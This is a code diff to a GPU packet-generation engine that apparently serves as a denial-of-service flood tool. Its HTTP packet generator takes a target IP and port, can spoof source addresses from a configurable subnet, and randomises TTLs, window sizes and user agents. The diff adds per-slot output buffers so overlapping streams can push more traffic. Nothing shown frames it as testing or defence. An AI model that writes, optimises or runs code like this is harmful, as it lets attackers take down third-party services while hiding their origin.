@@ -1026,6 +1026,7 @@ class GPUPayloadEngine:
         P1 FIX #10: Pre-allocate buffers (Memory Pool)
         """
         self.count = int(count)
+        self.capacity = int(count)
         self.max_packet_size = int(max_packet_size)
         if self.count <= 0:
             raise ValueError(f"count must be > 0, got {count}")
@@ -1037,16 +1038,19 @@ class GPUPayloadEngine:
             self.rng_seed = random.randint(0, 0xFFFFFFFF)
         else:
             self.rng_seed = int(rng_seed) & 0xFFFFFFFF
-        self.rng_states = create_xoroshiro128p_states(self.count, seed=self.rng_seed)
+        self.rng_states = create_xoroshiro128p_states(self.capacity, seed=self.rng_seed)
         
         # Pre-allocate packet buffer
-        self.packets_gpu = cp.zeros((self.count * self.max_packet_size), dtype=cp.uint8)
-        self.packet_lengths = cp.zeros(self.count, dtype=cp.uint32)
-        self.h2_method_idx = cp.zeros(self.count, dtype=cp.uint16)
-        self.h2_path_idx = cp.zeros(self.count, dtype=cp.uint16)
-        self.h2_ua_idx = cp.zeros(self.count, dtype=cp.uint16)
-        self.h2_step_used = cp.zeros(self.count, dtype=cp.uint8)
-        self.h2_valid_flags = cp.zeros(self.count, dtype=cp.uint8)
+        self.packets_gpu = cp.zeros((self.capacity * self.max_packet_size), dtype=cp.uint8)
+        self.packet_lengths = cp.zeros(self.capacity, dtype=cp.uint32)
+        self.h2_method_idx = cp.zeros(self.capacity, dtype=cp.uint16)
+        self.h2_path_idx = cp.zeros(self.capacity, dtype=cp.uint16)
+        self.h2_ua_idx = cp.zeros(self.capacity, dtype=cp.uint16)
+        self.h2_step_used = cp.zeros(self.capacity, dtype=cp.uint8)
+        self.h2_valid_flags = cp.zeros(self.capacity, dtype=cp.uint8)
+        # Slot-specific output buffers for overlapping multi-stream pipelines.
+        self._slot_packets_gpu = {0: self.packets_gpu}
+        self._slot_packet_lengths = {0: self.packet_lengths}
         
         # Default Components
         self.methods = _validate_component_list("methods", ["GET", "POST", "HEAD"]) or []
@@ -1096,7 +1100,20 @@ class GPUPayloadEngine:
             self.uas = _validate_component_list("uas", uas) or []
         self._upload_components()
 
-    def generate_fused_http(self, target_ip, target_port, real_src_ip, spoof_ip=True, stream=None, gateway_mac=0xFFFFFFFFFFFF, spoof_subnet="1.0.0.0/8", window_sizes=None, mss_values=None, ttls=None, current_time=0):
+    def _get_slot_output_buffers(self, slot: int):
+        slot_id = int(slot)
+        if slot_id < 0:
+            slot_id = 0
+        packets_gpu = self._slot_packets_gpu.get(slot_id)
+        packet_lengths = self._slot_packet_lengths.get(slot_id)
+        if packets_gpu is None or packet_lengths is None:
+            packets_gpu = cp.zeros((self.capacity * self.max_packet_size), dtype=cp.uint8)
+            packet_lengths = cp.zeros(self.capacity, dtype=cp.uint32)
+            self._slot_packets_gpu[slot_id] = packets_gpu
+            self._slot_packet_lengths[slot_id] = packet_lengths
+        return packets_gpu, packet_lengths
+
+    def generate_fused_http(self, target_ip, target_port, real_src_ip, spoof_ip=True, stream=None, gateway_mac=0xFFFFFFFFFFFF, spoof_subnet="1.0.0.0/8", window_sizes=None, mss_values=None, ttls=None, current_time=0, slot: int = 0):
         """
         P1 FIX #9: Uses fused kernel for maximum performance.
         P2 FIX #19: Added gateway_mac support.
@@ -1122,10 +1139,14 @@ class GPUPayloadEngine:
         if window_sizes is None: window_sizes = cp.zeros(self.count, dtype=cp.uint16)
         if mss_values is None: mss_values = cp.zeros(self.count, dtype=cp.uint16)
         if ttls is None: ttls = cp.zeros(self.count, dtype=cp.uint8)
-        self.packet_lengths[:self.count] = 0
+        packets_gpu, packet_lengths = self._get_slot_output_buffers(slot)
+        packet_lengths[:self.count] = 0
+        # Keep backward-compat accessors for call sites that read engine attributes.
+        self.packets_gpu = packets_gpu
+        self.packet_lengths = packet_lengths
 
         fused_http_generator_kernel[blocks_per_grid, threads_per_block, stream](
-            self.packets_gpu, self.rng_states, self.count, self.max_packet_size,
+            packets_gpu, self.rng_states, self.count, self.max_packet_size,
             target_ip_int, target_port, real_src_ip_int, 1 if spoof_ip else 0,
             self.d_methods, self.d_m_offs, self.d_m_lens, self.n_methods,
             self.d_paths, self.d_p_offs, self.d_p_lens, self.n_paths,
@@ -1137,9 +1158,9 @@ class GPUPayloadEngine:
             window_sizes, mss_values, ttls,
             self.session_steps, self.session_active_paths, self.session_timers,
             np.uint64(current_time),
-            self.packet_lengths
+            packet_lengths
         )
-        return self.packets_gpu, self.max_packet_size
+        return packets_gpu, self.max_packet_size
 
     def generate_h2_request_plan(self, target_ip: str, count: Optional[int] = None, current_time: int = 0) -> H2RequestPlan:
         """Generate HTTP/2 request plan on GPU, consumed by CPU httpx transport."""
